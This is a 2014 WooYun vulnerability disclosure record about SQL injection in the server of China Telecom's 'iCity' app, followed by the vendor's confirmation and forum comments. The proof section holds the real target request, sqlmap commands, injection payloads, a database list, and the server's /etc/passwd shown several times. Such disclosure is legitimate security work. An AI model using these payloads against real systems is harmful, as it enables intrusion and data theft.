{"id": 508, "wybug_id": "wooyun-2014-075388", "wybug_title": "中国电信某APP服务端SQL注射", "wybug_corp": "中国电信", "wybug_author": "超威蓝猫", "wybug_date": "2014-09-07 22:14", "wybug_open_date": "2014-10-22 22:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向公众公开  简要描述： 中国电信某APP服务端SQL注射 详细说明：  从豌豆荚下载中国电信的\"爱城市\"APP\n\n打开应用后抓包发现这么一条请求:\n\n\nPOST /exter.shtml?baseLine=400&serviceType=1038 HTTP/1.1User-Agent: ffcs/icityContent-Length: 49Content-Type: application/x-www-form-urlencodedHost: www.153.cn:8081Connection: Keep-Aliveprovince=&client_type=icity_ver&product_version=6\n其中province参数存在SQL注射。\n\n   漏洞证明：  \nsqlmap.py -r e:\\1.txt --dbs --current-user --is-dba\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: province    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: province=-8423' OR (1750=1750)#&client_type=icity_ver&product_version=6    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)    Payload: province=' AND EXTRACTVALUE(5426,CONCAT(0x5c,0x7172637571,(SELECT (CASE WHEN (5426=5426) THEN 1 ELSE 0 END)),0x7171647771)) AND 'gKkU'='gKkU&client_type=icity_ver&product_version=6    Type: UNION query    Title: MySQL UNION query (NULL) - 9 columns    Payload: province=' UNION ALL SELECT CONCAT(0x7172637571,0x74704c786d6163664a72,0x7171647771),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&client_type=icity_ver&product_version=6    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (comment)    Payload: province=' AND SLEEP(5)#&client_type=icity_ver&product_version=6---web application technology: Nginxback-end DBMS: MySQL 5.1current user:    'remote@%'current user is DBA:    Trueavailable databases [14]:[*] 127.0.0.1[*] bobing_test[*] icity[*] icity_busi[*] icity_cms[*] icity_pay[*] information_schema[*] memory[*] mysql[*] performance_schema[*] share[*] test[*] traffic[*] v7\n\nsqlmap.py -r e:\\1.txt --file-read=/etc/passwd\n\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinqpidd:x:497:496:Owner of Qpidd Daemons:/var/lib/qpidd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpulse:x:496:494:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinicity:x:500:500::/home/icity:/bin/bashmysql:x:501:501::/home/mysql:/bin/bashoracle:x:502:502::/home/oracle:/bin/bashroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinqpidd:x:497:496:Owner of Qpidd Daemons:/var/lib/qpidd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpulse:x:496:494:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinicity:x:500:500::/home/icity:/bin/bashmysql:x:501:501::/home/mysql:/bin/bashoracle:x:502:502::/home/oracle:/bin/bashroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinqpidd:x:497:496:Owner of Qpidd Daemons:/var/lib/qpidd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpulse:x:496:494:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinicity:x:500:500::/home/icity:/bin/bashmysql:x:501:501::/home/mysql:/bin/bashoracle:x:502:502::/home/oracle:/bin/bashroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinqpidd:x:497:496:Owner of Qpidd Daemons:/var/lib/qpidd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpulse:x:496:494:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinicity:x:500:500::/home/icity:/bin/bashmysql:x:501:501::/home/mysql:/bin/bashoracle:x:502:502::/home/oracle:/bin/bashroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinsaslauth:x:498:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinqpidd:x:497:496:Owner of Qpidd Daemons:/var/lib/qpidd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinpulse:x:496:494:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinicity:x:500:500::/home/icity:/bin/bashmysql:x:501:501::/home/mysql:/bin/bashoracle:x:502:502::/home/oracle:/bin/bash\n   修复方案：  电信更专业咯   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-12 16:42 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国电信集团公司处置。APP服务端案例，rank 12 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-07 22:39 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  辣鸡涛肯定是童年被电信怪蜀黍侵犯过     \n     2014-09-07 23:21 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @魇 辣鸡梦魔    \n     2014-09-08 09:00 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @超威蓝猫 辣鸡蓝猫    \n     2014-09-08 19:28 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  MARK    \n     2014-09-10 12:45 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  首先得下个电信的APP    \n     2014-10-22 22:36 |    \t\t小豹 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 一个人的寂寞，整个群的错234236)\t\t \n  问问楼主。burp如何截断软件的请求？    \n     2014-10-22 23:25 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @小豹 在安卓虚拟机中设置代理。    \n     2014-10-23 07:13 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @超威蓝猫 你不是准备高考了吗?    \n     2014-10-23 11:43 |    \t\t小卖部部长 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        | 别拿部长不当干部！)\t\t \n  APP问题很多，就是想在电脑上安装模拟器。。。哎。    \n     2014-10-23 12:33 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @scanf nywnss    \n     2014-10-23 17:02 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @超威蓝猫 @超威蓝猫 wmrnss    \n     2014-10-23 21:47 |    \t\t小豹 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 一个人的寂寞，整个群的错234236)\t\t \n  @超威蓝猫 哦哦，原来如此。谢谢    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}